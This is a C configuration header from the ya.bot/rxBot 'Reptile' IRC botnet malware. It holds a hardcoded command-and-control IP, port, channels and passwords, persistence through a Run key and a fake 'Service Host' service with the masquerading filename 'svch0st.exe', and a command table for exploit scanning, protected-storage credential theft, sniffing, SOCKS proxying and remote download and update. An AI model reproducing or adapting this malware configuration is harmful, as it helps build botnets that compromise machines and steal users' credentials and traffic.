/*  ya.bot  */

#ifndef NO_FAKECONFIG

//botbotbotbotbotbotbotbotbotbotbotbotbot
//Original code from rxBot Reptile
//botbotbotbotbotbotbotbotbotbotbotbotbot

const char *fake_botid = "0.37";
const char *fake_mutexhandle = "R3PTiL3";
const char *fake_prefix	= ".";
const char *fake_version = "Reptile";
const char *fake_versionlist = "mIRC v6.14 Khaled Mardam-Bey";

const char *fake_authost[] =
{
		"*!*@*",
};
const char *fake_password = "j00c4n7gu355d1z0n3";

const char *fake_cononstart = "http://windowsupdate.microsoft.com/";
const char *fake_filename = "svch0st.exe";
const char *fake_movepath = "%windir%";
const char *fake_servicename = "Service Host";
const char *fake_servicedisplayname = "Service Host";
const char *fake_servicedesc = "Provides system host support for services";
const char *fake_runkey[] =
{
		"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run",
		"Service Host",
};

bool fake_bmodeonjoin = FALSE;
const char *fake_servers[] =
{
		"211.5.97.170",
		"",
		"3337",
		FALSE,
		"#pwn",
		"pw0n4g3",
		"",
		"",
		"#pwn-exp",
		"#pwn-sniff",
		"#pwn-warn"
};

int fake_bindport = 4460;
int fake_ftpdport = 8082;
int fake_redirport = 8060;
int fake_sock4port = 8069;
bool fake_staticftpd = FALSE;

const char *fake_itkey[] =
{
		"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Shell Extensions",
		"Installed Time"
};
const char *fake_meltkey[] =
{
		"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Shell Extensions",
		"MeltMe",
};
const char *fake_rupkey[] =
{
		"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Shell Extensions",
		"Record"
};


const char *fake_main_title = "MAIN//";
const char *fake_threads_title = "THREADS//";
const char *fake_process_title = "PROC//";
const char *fake_irc_title = "IRC//";
const char *fake_sec_title = "SECURE//";
const char *fake_unsec_title = "UNSECURE//";
const char *fake_scan_title = "SCAN//";
const char *fake_ftp_title = "FTP//";
const char *fake_netinfo_title = "NETINFO//";
const char *fake_sysinfo_title = "SYSINFO//";
const char *fake_drives_title = "DRIVES//";
const char *fake_mirc_title = "MIRC//";
const char *fake_file_title = "FILE//";
const char *fake_download_title = "DOWNLOAD//";
const char *fake_update_title = "UPDATE//";
const char *fake_logic_title = "LOGIC//";
const char *fake_reg_title = "REG//";
const char *fake_pstore_title = "PSTORE//";
const char *fake_netstatp_title = "NETSTATP//";
const char *fake_sniffer_title = "SNIFFER//";
const char *fake_tcp_title = "TCP//";
const char *fake_udp_title = "UDP//";
const char *fake_speedtest_title = "SPEEDTEST//";
const char *fake_sock4_title = "SOCKS4//";
const char *fake_redirect_title = "REDIRECT//";
const char *fake_warn_title = "\2WARN\2//";


const char *fake_cmd_on = "on";
const char *fake_cmd_off = "off";
const char *fake_cmd_all = "all";

const char *fake_cmd_login_1 = "login";
const char *fake_cmd_login_2 = "l";

const char *fake_cmd_threads_1 = "threads";
const char *fake_cmd_threads_2 = "t";
const char *fake_cmd_threads_sub = "sub";
const char *fake_cmd_threads_kill_1 = "kill";
const char *fake_cmd_threads_kill_2 = "k";

const char *fake_cmd_logout_1 = "logout";
const char *fake_cmd_logout_2 = "lo";

const char *fake_cmd_who = "who";

const char *fake_cmd_remove_1 = "remove";
const char *fake_cmd_remove_2 = "bye";

const char *fake_cmd_testdlls = "testdlls";

const char *fake_cmd_cel = "cel";

const char *fake_cmd_uptime_1 = "uptime";
const char *fake_cmd_uptime_2 = "up";

const char *fake_cmd_insttime_1 = "installed";
const char *fake_cmd_insttime_2 = "it";

const char *fake_cmd_version_1 = "version";
const char *fake_cmd_version_2 = "v";

const char *fake_cmd_status_1 = "status";
const char *fake_cmd_status_2 = "s";

const char *fake_cmd_secure_1 = "secure";
const char *fake_cmd_secure_2 = "sec";
const char *fake_cmd_unsecure_1 = "unsecure";
const char *fake_cmd_unsecure_2 = "unsec";

const char *fake_cmd_process_1 = "process";
const char *fake_cmd_process_2 = "ps";
const char *fake_cmd_process_list = "list";
const char *fake_cmd_process_kill = "kill";
const char *fake_cmd_process_del = "del";
const char *fake_cmd_process_hide = "hide";
const char *fake_cmd_process_create = "create";

const char *fake_cmd_nickupd_1 = "nickupdate";
const char *fake_cmd_nickupd_2 = "nu";
const char *fake_cmd_rndnick_1 = "randnick";
const char *fake_cmd_rndnick_2 = "rand";

const char *fake_cmd_eftpd_1 = "exploitftpd";
const char *fake_cmd_eftpd_2 = "eftpd";

const char *fake_cmd_socks4_1 = "socks4";
const char *fake_cmd_socks4_2 = "s4";

const char *fake_cmd_redirect_1 = "redirect";
const char *fake_cmd_redirect_2 = "rd";

const char *fake_cmd_speedtest_1 = "speedtest";
const char *fake_cmd_speedtest_2 = "speed";

const char *fake_cmd_netstatp_1 = "netstatp";
const char *fake_cmd_netstatp_2 = "nsp";

const char *fake_cmd_sniffer_1 = "sniffer";
const char *fake_cmd_sniffer_2 = "sniff";

const char *fake_cmd_iestart_1 = "iestart";
const char *fake_cmd_iestart_2 = "ies";

const char *fake_cmd_encrypt_1 = "encrypt";
const char *fake_cmd_encrypt_2 = "enc";

const char *fake_cmd_join_1 = "join";
const char *fake_cmd_join_2 = "j";

const char *fake_cmd_part_1 = "part";
const char *fake_cmd_part_2 = "p";

const char *fake_cmd_raw_1 = "raw";
const char *fake_cmd_raw_2 = "r";

const char *fake_cmd_prefix_1 = "prefix";
const char *fake_cmd_prefix_2 = "pr";

const char *fake_cmd_dns_1 = "resolve";
const char *fake_cmd_dns_2 = "dns";

const char *fake_cmd_currentip_1 = "currentip";
const char *fake_cmd_currentip_2 = "cip";
const char *fake_cmd_scanstats_1 = "stats";
const char *fake_cmd_scanstats_2 = "st";
const char *fake_cmd_banscan_1 = "banner";
const char *fake_cmd_banscan_2 = "ban";
const char *fake_cmd_advscan_1 = "advscan";
const char *fake_cmd_advscan_2 = "asc";
const char *fake_cmd_scanall_1 = "scanall";
const char *fake_cmd_scanall_2 = "sa";
const char *fake_cmd_lsascan_1 = "lsascan";
const char *fake_cmd_lsascan_2 = "lsa";
const char *fake_cmd_ntscan_1 = "ntscan";
const char *fake_cmd_ntscan_2 = "nts";
const char *fake_cmd_wksescan_1 = "wksescan";
const char *fake_cmd_wksescan_2 = "wkse";
const char *fake_cmd_wksoscan_1 = "wksoscan";
const char *fake_cmd_wksoscan_2 = "wkso";

const char *fake_cmd_flusharp_1 = "flusharp";
const char *fake_cmd_flusharp_2 = "farp";

const char *fake_cmd_flushdns_1 = "flushdns";
const char *fake_cmd_flushdns_2 = "fdns";

const char *fake_cmd_pstore_1 = "pstore";
const char *fake_cmd_pstore_2 = "pst";

const char *fake_cmd_sysinfo_1 = "sysinfo";
const char *fake_cmd_sysinfo_2 = "si";

const char *fake_cmd_netinfo_1 = "netinfo";
const char *fake_cmd_netinfo_2 = "ni";

const char *fake_cmd_drvinfo_1 = "driveinfo";
const char *fake_cmd_drvinfo_2 = "di";
const char *fake_cmd_drvinfo_total_1 = "total";
const char *fake_cmd_drvinfo_total_2 = "t";
const char *fake_cmd_drvinfo_mb = "mb";
const char *fake_cmd_drvinfo_gb = "gb";

const char *fake_cmd_mirccmd_1 = "mirccmd";
const char *fake_cmd_mirccmd_2 = "mirc";

const char *fake_cmd_system_1 = "system";
const char *fake_cmd_system_2 = "sys";

const char *fake_cmd_filectrl_1 = "file";
const char *fake_cmd_filectrl_2 = "f";

const char *fake_cmd_filectrl_read_1 = "type";
const char *fake_cmd_filectrl_read_2 = "cat";
const char *fake_cmd_filectrl_exst_1 = "exists";
const char *fake_cmd_filectrl_exst_2 = "ex";
const char *fake_cmd_filectrl_del_1 = "del";
const char *fake_cmd_filectrl_del_2 = "rm";
const char *fake_cmd_filectrl_rmdir = "rmdir";
const char *fake_cmd_filectrl_move_1 = "move";
const char *fake_cmd_filectrl_move_2 = "mv";
const char *fake_cmd_filectrl_copy_1 = "copy";
const char *fake_cmd_filectrl_copy_2 = "cp";
const char *fake_cmd_filectrl_att_1 = "attrib";
const char *fake_cmd_filectrl_att_2 = "at";
const char *fake_cmd_filectrl_open_1 = "open";
const char *fake_cmd_filectrl_open_2 = "op";

const char *fake_cmd_download_1 = "down";
const char *fake_cmd_download_2 = "wget";
const char *fake_cmd_update_1 = "update";
const char *fake_cmd_update_2 = "upd";

const char *fake_cmd_if_1 = "if";
const char *fake_cmd_if_2 = "i";
const char *fake_cmd_else_1 = "else";
const char *fake_cmd_else_2 = "e";
const char *fake_cmd_ifelse_nick_1 = "nick";
const char *fake_cmd_ifelse_nick_2 = "n";
const char *fake_cmd_ifelse_host_1 = "host";
const char *fake_cmd_ifelse_host_2 = "h";
const char *fake_cmd_ifelse_id = "id";
const char *fake_cmd_ifelse_uptime_1 = "uptime";
const char *fake_cmd_ifelse_uptime_2 = "up";
const char *fake_cmd_ifelse_ruptime_1 ="recordup";
const char *fake_cmd_ifelse_ruptime_2 ="rup";
const char *fake_cmd_ifelse_priv_1 = "private";
const char *fake_cmd_ifelse_priv_2 = "p";
const char *fake_cmd_ifelse_status_1 = "status";
const char *fake_cmd_ifelse_status_2 = "s";

const char *fake_auth_good = "%s Password accepted.";
const char *fake_auth_full = "%s Login failed, too many logged in users.";
const char *fake_spy_privmsg = "%s Possible spy: %s!%s@%s (Sent PM: \"%s\")";
const char *fake_auth_bad = "%s Failed authentication by: %s!%s@%s (Pass Tried: %s)";
const char *fake_logout = "%s User %s logged out.";
const char *fake_sl_logout = "%s Slot <%i> logged out.";
const char *fake_sl_no_logout = "%s No user logged in at slot: <%i>";
const char *fake_sl_in_logout = "%s Invalid login slot number: <%i>";
const char *fake_thread_stop = "%s Stopped: <%d> thread(s).";
const char *fake_thread_ac = "%s No active threads found.";
const char *fake_thread_kill = "%s Killed thread: <%s>";
const char *fake_thread_fkill = "%s Failed to kill thread: <%s>";
const char *fake_thread_alr = "%s %s already running at thread number: <%d>.";
const char *fake_thread_fail = "%s Failed to start %s, error: <%d>.";
const char *fake_status = "%s Status: %s. Box Uptime: %s, Bot Uptime: %s, Connected for: %s.";
const char *fake_installed = "%s Bot installed on: %s.";
const char *fake_kick_msg = "Go fuck yourself %s.";
const char *fake_auth_ali = "%s You are already logged in.";
const char *fake_quit_rem = "Remove command received from: %s!%s@%s";
const char *fake_quit_upd = "Update command received.";
const char *fake_noadvapi = "%s Advapi.dll is not loaded.";
const char *fake_nopstore = "%s PStore.dll is not loaded.";
const char *fake_main_thread = "%s Main bot thread.";
const char *fake_rup_thread = "%s Record uptime checker.";
const char *fake_asecure_thread = "%s Auto-Secure.";
const char *fake_bad_format = "%s Missing parameter(s).";
const char *fake_exip_resolve = "Couldn't resolve host";
#endif